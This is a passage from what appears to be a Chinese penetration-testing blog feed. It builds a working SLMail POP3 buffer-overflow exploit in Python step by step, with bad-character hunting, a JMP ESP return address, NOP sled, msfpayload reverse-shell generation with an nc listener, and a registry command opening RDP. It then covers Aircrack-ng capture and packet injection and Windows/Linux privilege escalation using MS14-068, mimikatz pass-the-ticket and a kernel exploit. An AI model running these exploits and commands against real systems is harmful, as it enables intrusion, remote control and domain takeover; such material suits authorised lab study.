class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*<span class="number">20</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>思路:<br>将EIP修改为shellcode代码的内存地址,将shellcode写入到该地址空间,程序读取EIP寄存器数值,将跳转到shellcode代码段并执行；<br>寻找可存放shellcode的内存空间</p><blockquote><h4 id="python代码06-py"><a href="#python代码06-py" class="headerlink" title="python代码06.py"></a>python代码<code>06.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*(<span class="number">3500</span><span class="number">-2606</span><span class="number">-4</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>不同类型的程序,协议,漏洞,会将某些字符认为是坏字符,这些字符有固定用途<br>    返回地址,Shellcode,buffer中都不能出现坏字符<br>    null byte (0x00) 空字符,用于终止字符串的拷贝操作<br>    return (0x0D)回车操作,表示POP3 PASS命令输入完成<br>    思路:发送0x00—-0xff 256个字符,查找所有坏字符<br>    00000000 11111111 256 #二进制</p><blockquote><h4 id="python代码07-py"><a href="#python代码07-py" class="headerlink" title="python代码07.py"></a>python代码<code>07.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"</span></span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"</span></span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"</span></span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"</span></span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"</span></span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"</span></span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"</span></span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"</span></span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"</span></span><br><span class="line"><span class="string">"\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"</span></span><br><span class="line"><span class="string">"\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"</span></span><br><span class="line"><span class="string">"\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"</span></span><br><span class="line"><span class="string">"\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"</span></span><br><span class="line"><span class="string">"\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"</span></span><br><span class="line"><span class="string">"\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+badchars</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'107.191.43.139'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><pre><code>0x0A    0x0D    0x00    #坏字符</code></pre><p>重定向数据流<br>    用ESP的地址替换EIP的值<br>    但是ESP地址变化,硬编码不可行<br>    SLMaail线程应用程序,操作系统为每个线程分配一段地址范围,每个线程地址范围不确定<br>变通思路<br>    在内存中寻找地址固定的系统模块<br>    在模块中寻找JMP ESP 指令的地址跳转,再由该指令间接跳转到ESP,从而执行shellcode<br>    mona.py脚本识别内存模块,搜索”return address”是JMP ESP指令的模块<br>    寻找无DEP,ALSR保护的内存地址<br>    内存地址不包含坏字符<br>    寻找不受保护的系统模块<br>        !mona modules<br>    将汇编指令jmp esp 转换为二进制<br>        <code>/usr/share/metasploit-framework/tools/exploit/masm_shell.rb</code><br>        FFE4<br>    在模块中搜索FFE4指令<br>    <code>!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</code><br>        选择不包含坏字符的内存地址<br>    在该地址设置断点<br>    重发buffer</p><blockquote><h4 id="python代码08-py-地址全翻转"><a href="#python代码08-py-地址全翻转" class="headerlink" title="python代码08.py(地址全翻转)"></a>python代码<code>08.py</code>(地址全翻转)</h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"\xe3\x41\x4b\x5f"</span>+<span class="string">"C"</span>*<span class="number">390</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><blockquote><h4 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h4></blockquote><p><code>Scratch</code>        #写shellcode的工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;msfpayload -l</span><br><span class="line">.&#x2F;msfpayload win32_reverse lhost&#x3D;1.1.1.1 lport&#x3D;443 C</span><br><span class="line">.&#x2F;msfpayload win32_reverse lhost&#x3D;1.1.1.1 lport&#x3D;443 R | .&#x2F;msfencode -b &quot;\x00\x0a\x0d&quot;</span><br><span class="line">nc -vip 443</span><br></pre></td></tr></table></figure><blockquote><h4 id="python代码09-py"><a href="#python代码09-py" class="headerlink" title="python代码09.py"></a>python代码<code>09.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">shellcode=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"</span>+</span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"</span>+</span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"</span>+</span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"</span>+</span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"</span>+</span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"</span>+</span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"</span>+</span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"</span>+</span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"</span>+</span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"</span>+</span><br><span class="line"><span class="string">"\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"</span>+</span><br><span class="line"><span class="string">"\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"</span>+</span><br><span class="line"><span class="string">"\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"</span>+</span><br><span class="line"><span class="string">"\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"</span>+</span><br><span class="line"><span class="string">"\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"</span>+</span><br><span class="line"><span class="string">"\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"\xe3\x41\x4b\x5f"</span>+<span class="string">"\x90"</span>*<span class="number">8</span>+shellcode</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'107.191.43.139'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>shellcode执行结束后以ExitProcess方式推出整个进程,将导致邮件服务崩溃；<br>Slmail是一个基于线程的应用,适用ExitThread方式可以避免整个服务崩溃,可实现重复溢出；<br><code>./msfpayload win32_reverse lhost=1.1.1.1 EXITFUNC=thread lport=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code><br>    cmd注册表开启3389<br>    <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br>    RegSnap #工具</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h4 id=&quot;缓冲区溢出&quot;&gt;&lt;a href=&quot;#缓冲区溢出&quot; class=&quot;headerlink&quot; title=&quot;缓冲区溢出&quot;&gt;&lt;/a&gt;&lt;strong&gt;缓冲区溢出&lt;/strong&gt;&lt;/h4&gt;&lt;/blockquote&gt;
&lt;p&gt;程序漏洞从哪里来&lt;br&gt;  
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Buffer overflow" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Buffer-overflow/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="缓冲区溢出" scheme="http://c.cat.plus/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Aircrack-ng无线攻击套件</title>
    <link href="http://c.cat.plus/2013/06/12/Wireless_Attacks/Aircrack-ng%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E5%A5%97%E4%BB%B6/"/>
    <id>http://c.cat.plus/2013/06/12/Wireless_Attacks/Aircrack-ng%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E5%A5%97%E4%BB%B6/</id>
    <published>2013-06-11T16:12:02.000Z</published>
    <updated>2020-05-18T07:22:09.723Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="AIRCRACK-NG基础"><a href="#AIRCRACK-NG基础" class="headerlink" title="AIRCRACK-NG基础"></a><strong>AIRCRACK-NG基础</strong></h3></blockquote><p>无线渗透和审计神器<br>包含各种功能的工具套件<br>    网络检测<br>    嗅探抓包<br>    包注入<br>    密码破解</p><blockquote><h4 id="AIRMON-NG"><a href="#AIRMON-NG" class="headerlink" title="AIRMON-NG"></a>AIRMON-NG</h4></blockquote><p>检查完网卡驱动<br>    airmon-ng    #检查无线网卡驱动及芯片型号</p><blockquote><h5 id="开启和停止无线侦听"><a href="#开启和停止无线侦听" class="headerlink" title="开启和停止无线侦听"></a>开启和停止无线侦听</h5></blockquote><pre><code>airmon-ng check            #检查aircrack-ng套件和当前使用系统的兼容性airmon-ng check kill    #kill掉影响aircrack-ng使用的进程airmon-ng start wlan2 3    #开启无线网卡侦听,并指定3信道iwlist wlan2mon channel    #查看工作信道airmon-ng stop wlan2mon    #停止无线侦听</code></pre><blockquote><h4 id="AIRODUMP-NG"><a href="#AIRODUMP-NG" class="headerlink" title="AIRODUMP-NG"></a>AIRODUMP-NG</h4><pre><code>无线抓包airodump-ng wlan2mon    #扫描发现每一个信道里的APairodump-ng wlan2mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap #抓指定信道1,指定AP的数据,并写入文件aireplay -9 wlan2mon airreplay</code></pre></blockquote><pre><code>airodump-ng wlan2monairodump-ng wlan2mon -c 1 --bssid 00:11:22:33:44:55 -w file.capairodump-ng wlan2mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap --ivs</code></pre><p>BSSID:AP的MAC地址<br>PWR:网卡接收到的信号强度,距离越近信号越强<br>    -1:驱动不支持信号强度,STA距离超出信号接受范围<br>RXQ:最近10秒成功接收的数据帧的百分比(数据帧,管理帧),只有在固定信道时才会出现.<br>Beacons:接收到此AP发送的beacon帧数量<br>Data:抓到的数据帧数量(WEP表示IV数量),包含广播数据帧<br>/s:最近10秒内,每秒平均抓到的帧的数量<br>CH:信道号(从beacon帧中获得),信道重叠时可能发现其它信道<br>MB:AP支持的最大速率<br>ENC:采用的无线安全技术 WEP,WPA,WPA2,OPEN</p><p>CIPHER:采用的加密套件CCMP,TKIP,WEP40,WEP104<br>AUTH:身份认证方法MGT,PSK,SKA,OPEN<br>ESSID:无线网络名称,隐藏AP此值可能为空,airodump从probe和association request帧中发现隐藏AP<br>STATION:STA的MAC地址<br>Lost:通过sequence number判断最近10秒STA发送丢失的数据包数量(管理帧,数据帧)<br>    干扰,距离<br>    发包不能收,收包不能发<br>Packets:STA发送的数据包数量<br>Probes:STA探测的ESSID</p><blockquote><h4 id="AIRODUMP-NG排错"><a href="#AIRODUMP-NG排错" class="headerlink" title="AIRODUMP-NG排错"></a>AIRODUMP-NG排错</h4></blockquote><p>不显示任何AP和STA信息<br>    物理机场景下使用笔记本内置无线网卡时,确保BIOS中已启用无线网卡<br>    确认无线网卡在managed模式下可以正常工作<br>    尝试禁用network-manager服务<br>    尝试卸载rmmod和重新加载modprobe驱动<br>工作一段时间后airodump-ng无法继续抓包<br>    airmon-ng check kill<br>    确认wpa_supplicant进程已停止</p><blockquote><h4 id="AIREPLAY-NG"><a href="#AIREPLAY-NG" class="headerlink" title="AIREPLAY-NG"></a>AIREPLAY-NG</h4></blockquote><p>产生或者加速无线通信流量<br>    向无线网络中注入数据包<br>        伪造身份验证<br>        强制重新身份验证<br>        抓包重放<br>    用于后续WEP和WPA密码破解<br>    支持10种包注入<br>    获取包的两种途径<br>        指定接口(-i)<br>        抓包文件pcap(-r)</p><pre><code>aireplay-ng &lt;options&gt;&lt;interface name&gt;</code></pre><p>Filter命令选项(除0,1两种攻击方式)<br>Replay命令选项</p><p>AIREPLAY-NG排错<br>    Aireplay-ng命令挂起没有任何输出<br>        无线网卡与AP工作在不同信道<br>    报错”write failed:Cannot allocate memory wi_write():illegal seek”<br>        无线网卡使用Broadcom芯片(bcm43xx),替换为b43驱动可解决<br>    可注入但速度很慢,并提示内核消息”rtc:lost some interrupts at 1024Hz”<br>        没有修正方法,此时可以启动多个aireplay-ng命令提高速度<br>    使用-h参数指定注入MAC地址与网卡MAC地址不一致报错<br>        建议保持一致(macchange)</p><p>AIREPLAY-NG包注入测试<br>    检测网卡是否可以注入包<br>    检测AP的响应时间<br>        回包率反应链路质量<br>    如果有两个无线网卡,可以检测具体可以注入哪种攻击<br>    基本测试检测AP对probe广播的响应<br>        向每AP发30包<br>        网卡成功发送并可接收包的能力<br>    基本测试<br>        <code>aireplay -9 wlan2mon</code><br>    向隐藏AP/指定SSID注入<br>        <code>aireplay-ng -9 -e leven -a EC:26:CA:FA:03:DC wlan2mon</code><br>    card to card 注入测试    #网卡到网卡<br>        <code>aireplay-ng -9 -i wlan0mon wlan2mon</code><br>        具体攻击方式<br>        -i 作为AP的网卡<br>        5/7 Faild<br>            注入MAC和真实MAC<br>            相同时可以正常使用</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;AIRCRACK-NG基础&quot;&gt;&lt;a href=&quot;#AIRCRACK-NG基础&quot; class=&quot;headerlink&quot; title=&quot;AIRCRACK-NG基础&quot;&gt;&lt;/a&gt;&lt;strong&gt;AIRCRACK-NG基础&lt;/strong&gt;&lt;/h3
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="无线渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
    
      <category term="无线攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/"/>
    
    
      <category term="Aircrack-ng" scheme="http://c.cat.plus/tags/Aircrack-ng/"/>
    
      <category term="无线抓包" scheme="http://c.cat.plus/tags/%E6%97%A0%E7%BA%BF%E6%8A%93%E5%8C%85/"/>
    
      <category term="无线破解" scheme="http://c.cat.plus/tags/%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>利用漏洞和程序配置不当提权</title>
    <link href="http://c.cat.plus/2013/06/06/pentest/%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/"/>
    <id>http://c.cat.plus/2013/06/06/pentest/%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/</id>
    <published>2013-06-05T19:41:39.000Z</published>
    <updated>2020-05-18T05:10:05.904Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="利用漏洞提权windows"><a href="#利用漏洞提权windows" class="headerlink" title="利用漏洞提权windows"></a><strong>利用漏洞提权windows</strong></h3></blockquote><p><code>Ms11-080</code>        #此漏洞在中文版的系统中利用是DOS拒绝服务的攻击效果,而非提权</p><pre><code>Kb2592799    https://technet.microsoft.com/library/sevurity/ms11-080searchsploit Ms11-080exploits/windows/local/18176.py    Pyinstaller        #将python脚本编译为EXE需要用到的包    https://pypi.python.org/pypi/PyInstaller/2.1Pywin32            #将python脚本编译为EXE需要用到的扩展    http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/python pyinstaller.py --onefile 18176.py #将18176.py编译为exe可执行程序    MS11-046        #拒绝服务漏洞    DoSMs14-068        #普通用户提权到域服务器管理库    https://github.com/bidord/pykekms14-068.py -u user@lab.com -s userSID -d dc.lab.com拷贝 TGT_user1@lab.com.ccache 到windows系统本地管理员登录    mimikatz.exe log &quot;kerberos::ptc TGT_user@lab.com.ccache&quot; exit    dsa.msc        #域控制器管理</code></pre><blockquote><h3 id="利用漏洞提权linux"><a href="#利用漏洞提权linux" class="headerlink" title="利用漏洞提权linux"></a><strong>利用漏洞提权linux</strong></h3></blockquote><pre><code>Ubuntu 11.10    http://old-releases.ubuntu.com/releases/11.10gcc    sudo mount /dev/cdrom /media/cdrom    #挂载镜像    sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc    #把镜像加入安装源并安装GCC    gcc 18411.c -o expCVE-2012-0056    /proc/pid/mem    kernels&gt;=2.6.39    http://blog.zx2c4.com/749    scp /usr/share/exploitdb/platforms/linux/local/18411.c cat@192.168.1.118:/home/cat/        将利用脚本拷贝到目标机器</code></pre><blockquote><h3 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a><strong>利用配置不当提权</strong></h3></blockquote><p>与系统漏洞提权相比,更常用的方法<br>企业环境<br>补丁更新的全部已经安装<br>输入变量过滤之外更值得研发关注的安全隐患<br>以system权限启动<br>NTFS权限允许users修改删除</p><p><code>icacls</code><br>    <code>icacls c:\windows\*.exe /save perm /T</code>    #快速查找windows系统中所有NTFS权限配置不当的程序<br>    <code>i586-mingw32msvc-gcc -o admin.exe admin.c</code>    #快速查找linux系统中所有NTFS权限配置不当的程序<br><code>Find</code><br>    <code>find / -perm 777 -exec ls -l {} \;</code></p><p>应用系统的配置文件<br>    应用连接数据库的配置文件<br>    后台服务运行账号</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;利用漏洞提权windows&quot;&gt;&lt;a href=&quot;#利用漏洞提权windows&quot; class=&quot;headerlink&quot; title=&quot;利用漏洞提权windows&quot;&gt;&lt;/a&gt;&lt;strong&gt;利用漏洞提权windows&lt;/strong&gt;&lt;/h3
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="权限维持" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
    
      <category term="mimikatz" scheme="http://c.cat.plus/tags/mimikatz/"/>
    
      <category term="漏洞提权" scheme="http://c.cat.plus/tags/%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>本地提权常见手法</title>
    <link href="http://c.cat.plus/2013/06/03/pentest/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"/>
    <id>http://c.cat.plus/2013/06/03/pentest/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</id>
    <published>2013-06-03T11:11:19.000Z</published>
    <updated>2020-05-18T04:29:43.728Z</updated>
    
